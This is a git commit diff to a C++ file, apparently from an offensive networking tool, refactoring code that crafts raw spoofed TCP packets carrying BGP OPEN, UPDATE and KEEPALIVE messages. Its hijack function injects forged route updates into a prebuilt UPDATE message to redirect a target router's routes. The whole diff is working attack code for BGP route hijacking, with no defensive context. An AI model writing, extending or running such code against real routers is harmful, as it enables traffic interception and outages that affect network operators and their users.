c96388698efc20f8d326c9ead7c07352bb6eedf1
jptr218 <84092766+jptr218@users.noreply.github.com>
2021-06-21 19:11:28 +0100

    Update bgp.cpp

--- src/bgp.cpp
+++ src/bgp.cpp
@@ -1,11 +1,10 @@
 #include "alastor.h"
 
-bool hijack(pcap_t* handle, uint8_t* target, uint8_t* odest, uint8_t* ndest, uint8_t* gateway) {
+bool send_bgp(pcap_t* handle, uint8_t* from, uint8_t* to, uint8_t* gateway, u_char* buf, int sz, uint32_t seq) {
 	u_char pkt[100];
 	ether_header* eth = (ether_header*)pkt;
 	ip_hdr* ip = (ip_hdr*)&pkt[sizeof ether_header];
 	tcp_hdr* tcp = (tcp_hdr*)&pkt[sizeof ether_header + sizeof ip_hdr];
-	u_char bgp[100];
 
 	memcpy(eth->src, gateway, 6);
 	memcpy(eth->dest, gateway, 6);
@@ -15,20 +14,20 @@ bool hijack(pcap_t* handle, uint8_t* target, uint8_t* odest, uint8_t* ndest, uin
 	ip->ihl = sizeof ip_hdr / sizeof ULONG;
 	ip->dscp = 0;
 	ip->ecn = 1;
-	ip->len = htons(sizeof ip_hdr + sizeof tcp_hdr + 42);
+	ip->len = htons(sizeof ip_hdr + sizeof tcp_hdr + sz);
 	ip->id = 0;
 	ip->flags = 0;
 	ip->fOff = 0;
 	ip->ttl = 128;
 	ip->proto = IPPROTO_TCP;
 	ip->csum = 0;
-	memcpy(ip->src, ndest, 4);
-	memcpy(ip->dest, target, 4);
+	memcpy(ip->src, from, 4);
+	memcpy(ip->dest, to, 4);
 	ip->csum = checksum((USHORT*)ip, sizeof ip_hdr);
 
 	tcp->src_port = htons(179);
 	tcp->dst_port = htons(179);
-	tcp->seq = 0x0;
+	tcp->seq = htonl(seq);
 	tcp->ack_seq = 0x0;
 	tcp->doff = 5;
 	tcp->res1 = 0;
@@ -38,17 +37,42 @@ bool hijack(pcap_t* handle, uint8_t* target, uint8_t* odest, uint8_t* ndest, uin
 	tcp->ack = 0;
 	tcp->psh = 0;
 	tcp->rst = 0;
-	tcp->syn = 1;
+	tcp->syn = 0;
+	if (seq == 1) {
+		tcp->syn = 1;
+	}
 	tcp->fin = 0;
 	tcp->window_size = htons(155);
 	tcp->checksum = 0;
 	tcp->urgent_p = 0;
 
-	memcpy(bgp, bgp_update_prebuilt, 42);
-	memcpy(&bgp[33], ndest, 4);
-	memcpy(&bgp[38], odest, 4);
+	memcpy(&pkt[sizeof ether_header + sizeof ip_hdr + sizeof tcp_hdr], buf, sz);
+	return (pcap_sendpacket(handle, pkt, sizeof ether_header + sizeof ip_hdr + sizeof tcp_hdr + sz) != -1);
+}
 
-	memcpy(&pkt[sizeof ether_header + sizeof ip_hdr + sizeof tcp_hdr], bgp, 42);
+bool open_conn(pcap_t* handle, uint8_t* target, uint8_t* ndest, uint8_t* gateway, uint32_t seq) {
+	u_char pkt[100];
 
-	return (pcap_sendpacket(handle, pkt, sizeof ether_header + sizeof ip_hdr + sizeof tcp_hdr + 42) != -1);
+	memcpy(pkt, bgp_open_prebuilt, 29);
+	memcpy(&pkt[24], ndest, 4);
+	
+	return send_bgp(handle, ndest, target, gateway, pkt, 29, seq);
+}
+
+bool hijack(pcap_t* handle, uint8_t* target, uint8_t* odest, uint8_t* ndest, uint8_t* gateway, uint32_t seq) {
+	u_char pkt[100];
+
+	memcpy(pkt, bgp_update_prebuilt, 42);
+	memcpy(&pkt[33], ndest, 4);
+	memcpy(&pkt[38], odest, 4);
+	
+	return send_bgp(handle, ndest, target, gateway, pkt, 42, seq);
+}
+
+bool keepalive(pcap_t* handle, uint8_t* target, uint8_t* ndest, uint8_t* gateway, uint32_t seq) {
+	u_char pkt[100];
+
+	memcpy(pkt, bgp_keepalive_prebuilt, 19);
+
+	return send_bgp(handle, ndest, target, gateway, pkt, 19, seq);
 }
